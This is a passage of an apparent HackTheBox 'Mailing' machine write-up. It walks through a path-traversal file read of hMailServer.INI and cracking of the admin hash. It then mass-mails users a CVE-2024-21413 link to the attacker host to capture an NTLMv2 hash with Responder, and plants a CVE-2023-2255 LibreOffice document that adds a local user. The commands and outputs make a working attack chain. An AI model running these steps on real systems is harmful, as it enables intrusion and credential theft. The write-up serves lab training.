</span></span></code></pre></div><p><img alt="Mailing 5" src=/pentesting/images/Mailing_5.png></p><p>We confirm that we can read files, reaching a <code>LFI</code>.</p><p>Reading <a href="https://www.hmailserver.com/documentation/v5.4/?page=reference_inifilesettings" class=external-link target=_blank rel=noopener>file settings from hMailServer documentation</a>, it says that, by default, it is installed at <code>C:\Program Files\hMailServer</code>. Additionally, we can see the <a href="https://www.hmailserver.com/documentation/v5.4/?page=folderstructure" class=external-link target=_blank rel=noopener>hMailServer folder structure</a> from documentation as well. To summarize, important/sensible data should be located at <code>/Bin</code> directory. Reading <a href="https://www.hmailserver.com/documentation/v5.4/?page=ts_start_server" class=external-link target=_blank rel=noopener>&ldquo;Starting the server&rdquo; documentation</a> says that there should be a file called <code>hMailServer.INI</code>. Finally, reading <a href="https://www.hmailserver.com/forum/viewtopic.php?t=33793" class=external-link target=_blank rel=noopener>how to change hMailServer Password</a> we can see that this file <code>hMailServer.ini</code> stores credentials. As can be seen in the following example (provided in the latest link), they show that the file is stored at <code>C:\Program Files\hMailServer\Bin\hMailServer.INI</code>.</p><p><img alt="Mailing 6" src=/pentesting/images/Mailing_6.png></p><p>I attempt a <code>LFI</code> to this file:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>GET</span> <span class=nn>/download.php?file=\\\..\..\..\Program+Files\\\hMailServer\\\Bin\\\hMailServer.INI</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>mailing.htb</span>
</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0</span>
</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>en-US,en;q=0.5</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate, br</span>
</span></span><span class=line><span class=cl><span class=n>Referer</span><span class=o>:</span> <span class=l>http://mailing.htb/</span>
</span></span><span class=line><span class=cl><span class=n>Dnt</span><span class=o>:</span> <span class=l>1</span>
</span></span><span class=line><span class=cl><span class=n>Upgrade-Insecure-Requests</span><span class=o>:</span> <span class=l>1</span>
</span></span><span class=line><span class=cl><span class=n>Sec-Fetch-Dest</span><span class=o>:</span> <span class=l>document</span>
</span></span><span class=line><span class=cl><span class=n>Sec-Fetch-Mode</span><span class=o>:</span> <span class=l>navigate</span>
</span></span><span class=line><span class=cl><span class=n>Sec-Fetch-Site</span><span class=o>:</span> <span class=l>cross-site</span>
</span></span><span class=line><span class=cl><span class=n>Sec-Fetch-User</span><span class=o>:</span> <span class=l>?1</span>
</span></span><span class=line><span class=cl><span class=n>Te</span><span class=o>:</span> <span class=l>trailers</span>
</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
</span></span></code></pre></div><p><img alt="Mailing 7" src=/pentesting/images/Mailing_7.png></p><p>Does not work. But if I change <code>Program Files</code> to <code>Program Files (x86)</code> we do get something:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>GET</span> <span class=nn>/download.php?file=\\\..\..\..\Program+Files+(x86)\\\hMailServer\\\Bin\\\hMailServer.INI</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>mailing.htb</span>
</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0</span>
</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>en-US,en;q=0.5</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate, br</span>
</span></span><span class=line><span class=cl><span class=n>Referer</span><span class=o>:</span> <span class=l>http://mailing.htb/</span>
</span></span><span class=line><span class=cl><span class=n>Dnt</span><span class=o>:</span> <span class=l>1</span>
</span></span><span class=line><span class=cl><span class=n>Upgrade-Insecure-Requests</span><span class=o>:</span> <span class=l>1</span>
</span></span><span class=line><span class=cl><span class=n>Sec-Fetch-Dest</span><span class=o>:</span> <span class=l>document</span>
</span></span><span class=line><span class=cl><span class=n>Sec-Fetch-Mode</span><span class=o>:</span> <span class=l>navigate</span>
</span></span><span class=line><span class=cl><span class=n>Sec-Fetch-Site</span><span class=o>:</span> <span class=l>cross-site</span>
</span></span><span class=line><span class=cl><span class=n>Sec-Fetch-User</span><span class=o>:</span> <span class=l>?1</span>
</span></span><span class=line><span class=cl><span class=n>Te</span><span class=o>:</span> <span class=l>trailers</span>
</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
</span></span></code></pre></div><p><img alt="Mailing 8" src=/pentesting/images/Mailing_8.png></p><p>We find an encrypted password: <code>841bb5acfa6779ae432fd7a4e6600ba7</code> for a variable called <code>AdministratorPassword</code>. <code>hash-identifier</code> says that it could be a <code>MD5</code> password type:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ hash-identifier
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>&lt;SNIP&gt;
</span></span></span><span class=line><span class=cl><span class=go>--------------------------------------------------
</span></span></span><span class=line><span class=cl><span class=go> HASH: 841bb5acfa6779ae432fd7a4e6600ba7
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Possible Hashs:
</span></span></span><span class=line><span class=cl><span class=go>[+] MD5
</span></span></span><span class=line><span class=cl><span class=go>[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))
</span></span></span><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span></code></pre></div><p>Attempting a <code>Brute Force Password Cracking</code> with <code>Crackstation</code> (<a href=https://crackstation.net/ class=external-link target=_blank rel=noopener>https://crackstation.net/</a>):</p><p><img alt="Mailing 9" src=/pentesting/images/Mailing_9.png></p><p>I get a password: <code>homenetworkingadministrator</code>.</p><p>Searching for recent exploits for <code>hMailServer</code> leads to the vulnerability labeled as <a href=https://nvd.nist.gov/vuln/detail/CVE-2024-21413 class=external-link target=_blank rel=noopener>CVE-2024-21413</a>. This vulnerability is not for <code>hMailServer</code> itself, it is rather for <code>Microsoft Outlook</code> <code>Remote Code Execution</code> (<code>RCE</code>), but still applies for mails. Searching for <code>Proof of concepts</code> for this vulnerability I find <a href=https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability class=external-link target=_blank rel=noopener>this Github repository</a>. Basically, it would allow us to get the <code>NTLMv2</code> hash of any user that opens the malicious email. For this, just start a listener with <code>Responder</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sudo responder -I tun0 -wvd
</span></span></span></code></pre></div><p>Clone the repo:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ git clone https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.git
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Cloning into &#39;CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability&#39;...
</span></span></span><span class=line><span class=cl><span class=go>remote: Enumerating objects: 28, done.
</span></span></span><span class=line><span class=cl><span class=go>remote: Counting objects: 100% (28/28), done.
</span></span></span><span class=line><span class=cl><span class=go>remote: Compressing objects: 100% (27/27), done.
</span></span></span><span class=line><span class=cl><span class=go>remote: Total 28 (delta 7), reused 6 (delta 0), pack-reused 0
</span></span></span><span class=line><span class=cl><span class=go>Receiving objects: 100% (28/28), 14.48 KiB | 251.00 KiB/s, done.
</span></span></span><span class=line><span class=cl><span class=go>Resolving deltas: 100% (7/7), done.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>‚ùØ cd CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability
</span></span></span></code></pre></div><p>However, we still do not have users. For this I will go back to the website, where we have 3 potential users:</p><p><img alt="Mailing 10" src=/pentesting/images/Mailing_10.png></p><p>I create a list of potential users, where the first column is the First Name and the second column is the Last Name:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ cat team_names.txt
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Ruy Alonso
</span></span></span><span class=line><span class=cl><span class=go>Maya Bendito
</span></span></span><span class=line><span class=cl><span class=go>Gregory Smith
</span></span></span></code></pre></div><p>Back in the days I created a simple <code>Python</code> script (which can be downloaded from <a href=https://github.com/gunzf0x/HackTools/tree/main/CreatePotentialUsernames class=external-link target=_blank rel=noopener>my repository</a>) that accepts this format (<code>&lt;first -name> &lt;last-name></code>) and generate a list of potential users.</p><p>Running it creates a file called <code>potential_usernames.txt</code> in the current directory with the provided list:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ python3 ~/HackTools/CreatePotentialUsernames/create_potential_usernames.py -l team_names.txt
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[+] Total number of persons: 3
</span></span></span><span class=line><span class=cl><span class=go>[+] Total combinations/potential users added: 24
</span></span></span><span class=line><span class=cl><span class=go>[+] Data saved as &#39;/home/gunzf0x/HTB/HTBMachines/Easy/Mailing/content/potential_users.txt&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>‚ùØ cat team_names.txt
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Ruy Alonso
</span></span></span><span class=line><span class=cl><span class=go>Maya Bendito
</span></span></span><span class=line><span class=cl><span class=go>Gregory Smith
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>‚ùØ cat potential_users.txt | head -n 5
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>ralonso
</span></span></span><span class=line><span class=cl><span class=go>rualonso
</span></span></span><span class=line><span class=cl><span class=go>r.alonso
</span></span></span><span class=line><span class=cl><span class=go>ru.alonso
</span></span></span><span class=line><span class=cl><span class=go>ruyalonso
</span></span></span><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span></code></pre></div><p>Now, using <code>CVE-2024-21413</code> <code>PoC</code>, send multiple emails in a <code>Bash</code> oneliner. Since we have found the <code>administrator password</code> from the <code>LFI</code>, I assume that the user is called <code>administrator</code> (and, therefore, its email is <code>administrator@mailing.htb</code>) based on <a href=https://afterlogic.com/docs/webmail-pro-net/integration/integration-with-hmailserver class=external-link target=_blank rel=noopener>this post</a>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ for user in $(cat potential_users.txt); do python3 CVE-2024-21413.py --server mailing.htb --port 587 --username administrator@mailing.htb --password &#39;homenetworkingadministrator&#39; --sender administrator@mailing.htb --recipient &#34;${user}@mailing.htb&#34; --url &#34;\\10.10.16.6\meetings&#34; --subject &#34;Urgent meeting&#34; | grep -vE &#39;CVE-2024-21413|Alexander Hagenah&#39;; echo &#34;[+] Email sent to &#39;${user}@mailing.htb&#39;&#34;; done
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>‚úÖ Email sent successfully.
</span></span></span><span class=line><span class=cl><span class=go>[+] Email sent to &#39;ralonso@mailing.htb&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>‚úÖ Email sent successfully.
</span></span></span><span class=line><span class=cl><span class=go>[+] Email sent to &#39;rualonso@mailing.htb&#39;
</span></span></span><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span><span class=line><span class=cl><span class=go>‚úÖ Email sent successfully.
</span></span></span><span class=line><span class=cl><span class=go>[+] Email sent to &#39;gregory.smith@mailing.htb&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>‚úÖ Email sent successfully.
</span></span></span><span class=line><span class=cl><span class=go>[+] Email sent to &#39;gregory@mailing.htb&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>&lt;SNIP&gt;
</span></span></span></code></pre></div><p>And after some seconds I get a <code>NTLMv2</code> hash in <code>Responder</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sudo responder -I tun0
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>&lt;SNIP&gt;
</span></span></span><span class=line><span class=cl><span class=go>[+] Listening for events...
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[SMB] NTLMv2-SSP Client   : 10.10.11.14
</span></span></span><span class=line><span class=cl><span class=go>[SMB] NTLMv2-SSP Username : MAILING\maya
</span></span></span><span class=line><span class=cl><span class=go>[SMB] NTLMv2-SSP Hash     : maya::MAILING:6c10dd8070e57430:137948D065440DF9AC802EB0284E2129:01010000000000000083A79E45B5DA019057A551906D004C0000000002000800520055004B004A0001001E00570049004E002D005400360045004300560033004400320041004700440004003400570049004E002D00540036004500430056003300440032004100470044002E00520055004B004A002E004C004F00430041004C0003001400520055004B004A002E004C004F00430041004C0005001400520055004B004A002E004C004F00430041004C00070008000083A79E45B5DA010600040002000000080030003000000000000000000000000020000073387648E67CA5AB00CB5880ADB0D42E7453C4DD8074F6F77F09272FB7F09CF80A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E0036000000000000000000
</span></span></span><span class=line><span class=cl><span class=go>[*] Skipping previously captured hash for MAILING\maya
</span></span></span><span class=line><span class=cl><span class=go>[*] Skipping previously captured hash for MAILING\maya
</span></span></span><span class=line><span class=cl><span class=go>[*] Skipping previously captured hash for MAILING\maya
</span></span></span><span class=line><span class=cl><span class=go>[*] Skipping previously captured hash for MAILING\maya
</span></span></span><span class=line><span class=cl><span class=go>[*] Skipping previously captured hash for MAILING\maya
</span></span></span><span class=line><span class=cl><span class=go>[*] Skipping previously captured hash for MAILING\maya
</span></span></span></code></pre></div><p>I save this hash in a file called <code>maya_hash</code>, and attempt, again, a <code>Brute Force Password Cracking</code> with <code>JohnTheRipper</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ john --wordlist=/usr/share/wordlists/rockyou.txt maya_hash
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Using default input encoding: UTF-8
</span></span></span><span class=line><span class=cl><span class=go>Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
</span></span></span><span class=line><span class=cl><span class=go>Will run 5 OpenMP threads
</span></span></span><span class=line><span class=cl><span class=go>Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
</span></span></span><span class=line><span class=cl><span class=go>m4y4ngs4ri       (maya)
</span></span></span><span class=line><span class=cl><span class=go>1g 0:00:00:20 DONE (2024-06-02 23:43) 0.04901g/s 290886p/s 290886c/s 290886C/s m5681687..m3skl3s
</span></span></span><span class=line><span class=cl><span class=go>Use the &#34;--show --format=netntlmv2&#34; options to display all of the cracked passwords reliably
</span></span></span><span class=line><span class=cl><span class=go>Session completed.
</span></span></span></code></pre></div><p>where we have found credentials: <code>maya:m4y4ngs4ri</code></p><p>I check if we can log in via <code>WinRM</code> with these credentials with <code>NetExec</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ netexec winrm 10.10.11.14 -u &#39;maya&#39; -p &#39;m4y4ngs4ri&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>WINRM       10.10.11.14     5985   MAILING          [*] Windows 10 / Server 2019 Build 19041 (name:MAILING) (domain:MAILING)
</span></span></span><span class=line><span class=cl><span class=go>WINRM       10.10.11.14     5985   MAILING          [+] MAILING\maya:m4y4ngs4ri (Pwn3d!)
</span></span></span></code></pre></div><p>and we can.</p><p>I log in with <code>evil-winrm</code> in the machine as <code>maya</code> user:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ evil-winrm -i 10.10.11.14 -u &#39;maya&#39; -p &#39;m4y4ngs4ri&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Evil-WinRM shell v3.5
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Info: Establishing connection to remote endpoint
</span></span></span><span class=line><span class=cl><span class=go>*Evil-WinRM* PS C:\Users\maya\Documents&gt;whoami
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>mailing\maya
</span></span></span></code></pre></div><p>where we can get the user flag at <code>maya</code> Desktop.</p><hr><h2 id=nt-auhoritysystem---administrator>NT Auhority/System - Administrator
<a class=heading-link href=#nt-auhoritysystem---administrator><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><p>Checking softwares I can see this machine has installed <code>LibreOffice</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>*Evil-WinRM* PS C:\Users\maya\Documents&gt; ls C:\&#39;program files&#39;\
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>    Directory: C:\program files
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Mode                 LastWriteTime         Length Name
</span></span></span><span class=line><span class=cl><span class=go>----                 -------------         ------ ----
</span></span></span><span class=line><span class=cl><span class=go>d-----         2/27/2024   5:30 PM                Common Files
</span></span></span><span class=line><span class=cl><span class=go>d-----          3/3/2024   4:40 PM                dotnet
</span></span></span><span class=line><span class=cl><span class=go>d-----          3/3/2024   4:32 PM                Git
</span></span></span><span class=line><span class=cl><span class=go>d-----         4/29/2024   6:54 PM                Internet Explorer
</span></span></span><span class=line><span class=cl><span class=go>d-----          3/4/2024   6:57 PM                LibreOffice
</span></span></span><span class=line><span class=cl><span class=go>d-----          3/3/2024   4:06 PM                Microsoft Update Health Tools
</span></span></span><span class=line><span class=cl><span class=go>d-----         12/7/2019  10:14 AM                ModifiableWindowsApps
</span></span></span><span class=line><span class=cl><span class=go>d-----         2/27/2024   4:58 PM                MSBuild
</span></span></span><span class=line><span class=cl><span class=go>d-----         2/27/2024   5:30 PM                OpenSSL-Win64
</span></span></span><span class=line><span class=cl><span class=go>d-----         3/13/2024   4:49 PM                PackageManagement
</span></span></span><span class=line><span class=cl><span class=go>d-----         2/27/2024   4:58 PM                Reference Assemblies
</span></span></span><span class=line><span class=cl><span class=go>d-----         3/13/2024   4:48 PM                RUXIM
</span></span></span><span class=line><span class=cl><span class=go>d-----         2/27/2024   4:32 PM                VMware
</span></span></span><span class=line><span class=cl><span class=go>d-----          3/3/2024   5:13 PM                Windows Defender
</span></span></span><span class=line><span class=cl><span class=go>d-----         4/29/2024   6:54 PM                Windows Defender Advanced Threat Protection
</span></span></span><span class=line><span class=cl><span class=go>d-----          3/3/2024   5:13 PM                Windows Mail
</span></span></span><span class=line><span class=cl><span class=go>d-----          3/3/2024   5:13 PM                Windows Media Player
</span></span></span><span class=line><span class=cl><span class=go>d-----         4/29/2024   6:54 PM                Windows Multimedia Platform
</span></span></span><span class=line><span class=cl><span class=go>d-----         2/27/2024   4:26 PM                Windows NT
</span></span></span><span class=line><span class=cl><span class=go>d-----          3/3/2024   5:13 PM                Windows Photo Viewer
</span></span></span><span class=line><span class=cl><span class=go>d-----         4/29/2024   6:54 PM                Windows Portable Devices
</span></span></span><span class=line><span class=cl><span class=go>d-----         12/7/2019  10:31 AM                Windows Security
</span></span></span><span class=line><span class=cl><span class=go>d-----         3/13/2024   4:49 PM                WindowsPowerShell
</span></span></span></code></pre></div><p>It brought me back memories from <a href=https://app.hackthebox.com/machines/588 class=external-link target=_blank rel=noopener>HTB Office</a> machine, since in that machine we had to inject a payload abusing the vulnerability <a href=https://nvd.nist.gov/vuln/detail/CVE-2023-2255 class=external-link target=_blank rel=noopener>CVE-2023-2255</a>, using <a href=https://github.com/elweth-sec/CVE-2023-2255 class=external-link target=_blank rel=noopener>this exploit</a>. I repeat that. I clone that repository and, then, generate a simple payload:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ git clone https://github.com/elweth-sec/CVE-2023-2255.git
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Cloning into &#39;CVE-2023-2255&#39;...
</span></span></span><span class=line><span class=cl><span class=go>remote: Enumerating objects: 10, done.
</span></span></span><span class=line><span class=cl><span class=go>remote: Counting objects: 100% (10/10), done.
</span></span></span><span class=line><span class=cl><span class=go>remote: Compressing objects: 100% (8/8), done.
</span></span></span><span class=line><span class=cl><span class=go>remote: Total 10 (delta 2), reused 5 (delta 0), pack-reused 0
</span></span></span><span class=line><span class=cl><span class=go>Receiving objects: 100% (10/10), 8.47 KiB | 456.00 KiB/s, done.
</span></span></span><span class=line><span class=cl><span class=go>Resolving deltas: 100% (2/2), done.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>‚ùØ cd CVE-2023-2255
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>‚ùØ python3 CVE-2023-2255.py --cmd &#39;net user gunzf0x gunzf0x123$ /add&#39; --output &#39;adduser.odt&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>File adduser.odt has been created !
</span></span></span></code></pre></div><p>where <code>10.10.16.6</code> is my attacker IP and <code>443</code> is the port I will start listening with <code>netcat</code>. Here I introduce a payload that will create a user with credentials <code>gunzf0x:gunzf0x123$</code>.</p><p>I upload the malicious generated <code>.odt</code> file using <code>upload</code> command from <code>evil-winrm</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>*Evil-WinRM* PS C:\Users\maya\Documents&gt; upload adduser.odt
</span></span></span></code></pre></div><p>Once the file has been uploaded to the victim machine, I execute the payload running, for example:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>*Evil-WinRM* PS C:\Users\maya\Documents&gt; Start-Process &#34;C:\Program Files\LibreOffice\program\soffice.exe&#34; -ArgumentList &#34;C:\Users\maya\Documents\adduser.odt&#34;
</span></span></span></code></pre></div><p>But nothing happens.</p><p>Analyzing directories, at <code>C:\</code> I can see an unusual folder called <code>Important Documents</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>*Evil-WinRM* PS C:\&gt; ls C:\
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>    Directory: C:\
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Mode                 LastWriteTime         Length Name
</span></span></span><span class=line><span class=cl><span class=go>----                 -------------         ------ ----
</span></span></span><span class=line><span class=cl><span class=go>d-----          6/3/2024   6:38 AM                Important Documents
</span></span></span><span class=line><span class=cl><span class=go>d-----         2/28/2024   8:49 PM                inetpub
</span></span></span><span class=line><span class=cl><span class=go>d-----         12/7/2019  10:14 AM                PerfLogs
</span></span></span><span class=line><span class=cl><span class=go>d-----          3/9/2024   1:47 PM                PHP
</span></span></span><span class=line><span class=cl><span class=go>d-r---         3/13/2024   4:49 PM                Program Files
</span></span></span><span class=line><span class=cl><span class=go>d-r---         3/14/2024   3:24 PM                Program Files (x86)
</span></span></span><span class=line><span class=cl><span class=go>d-r---          3/3/2024   4:19 PM                Users
</span></span></span><span class=line><span class=cl><span class=go>d-----          6/3/2024   6:40 AM                Windows
</span></span></span><span class=line><span class=cl><span class=go>d-----         4/12/2024   5:54 AM                wwwroot
</span></span></span></code></pre></div><p>If I check its permissions with <code>icacls</code> we can write in this folder as <code>maya</code> user:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>*Evil-WinRM* PS C:\&gt; icacls &#39;C:\Important Documents&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>C:\Important Documents MAILING\maya:(OI)(CI)(M)
</span></span></span><span class=line><span class=cl><span class=go>                       BUILTIN\Administradores:(I)(OI)(CI)(F)
</span></span></span><span class=line><span class=cl><span class=go>                       NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
</span></span></span><span class=line><span class=cl><span class=go>                       BUILTIN\Usuarios:(I)(OI)(CI)(RX)
</span></span></span><span class=line><span class=cl><span class=go>                       NT AUTHORITY\Usuarios autentificados:(I)(M)
</span></span></span><span class=line><span class=cl><span class=go>                       NT AUTHORITY\Usuarios autentificados:(I)(OI)(CI)(IO)(M)
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Successfully processed 1 files; Failed processing 0 files
</span></span></span></code></pre></div><p>So I decide to copy the malicious <code>.odt</code> to this directory:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>*Evil-WinRM* PS C:\Users\maya\Documents&gt; cmd.exe /c copy C:\Users\maya\Documents\adduser.odt &#39;C:\Important Documents\adduser.odt&#39;
</span></span></span></code></pre></div><p>and after some second, if I check users with <code>net user</code>, my added user is there:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>*Evil-WinRM* PS C:\Users\maya\Documents&gt; net user
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>User accounts for \\
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>-------------------------------------------------------------------------------
</span></span></span><span class=line><span class=cl><span class=go>Administrador            DefaultAccount           gunzf0x
</span></span></span><span class=line><span class=cl><span class=go>Invitado                 localadmin               maya
</span></span></span><span class=line><span class=cl><span class=go>WDAGUtilityAccount
</span></span></span><span class=line><span class=cl><span class=go>The command completed with one or more errors.
</span></span></span></code></pre></div><p>so it has been created. Also, the file is deleted from <code>C:\Important Documents\</code> directory.</p><p>Taking advantage of the fact that we already have a user created, I will try to add it to <code>Administrators</code> group. Checking <code>Administrador</code> user (that is just <code>Administrator</code> in spanish), it belongs to the groups:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>*Evil-WinRM* PS C:\Users\maya\Documents&gt; net user Administrador
</span></span></span><span class=line><span class=cl><span class=go>User name                    Administrador
</span></span></span><span class=line><span class=cl><span class=go>Full Name
